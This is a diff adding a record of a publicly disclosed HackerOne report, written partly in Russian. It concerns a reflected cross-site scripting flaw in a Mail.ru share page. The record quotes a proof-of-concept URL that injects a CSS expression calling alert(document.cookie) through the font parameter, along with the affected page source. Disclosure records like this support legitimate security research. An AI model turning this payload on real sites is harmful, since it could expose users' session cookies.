@@ -1,0 +1,16 @@
+ReportLink:https://hackerone.com/reports/12929
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/4lemon
+ReportedTo:Mail.ru(mailru)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:10.12.2014 19:27:15
+
+Summary:
+
+Ещё один отражённый XSS в тэге STYLE:
+http:/connect.mail.ru/share_friends?domain=pedsovet.kz&width=301&height=302&font=Tahoma;width:expression(alert(document.cookie));
+Source code:
+	<style type="text/css">
+		body {font-family: Tahoma;width:expression(alert(document.cookie));; color: black;background-color: white; margin: 0; padding: 0; border: 1px solid #ccc; }
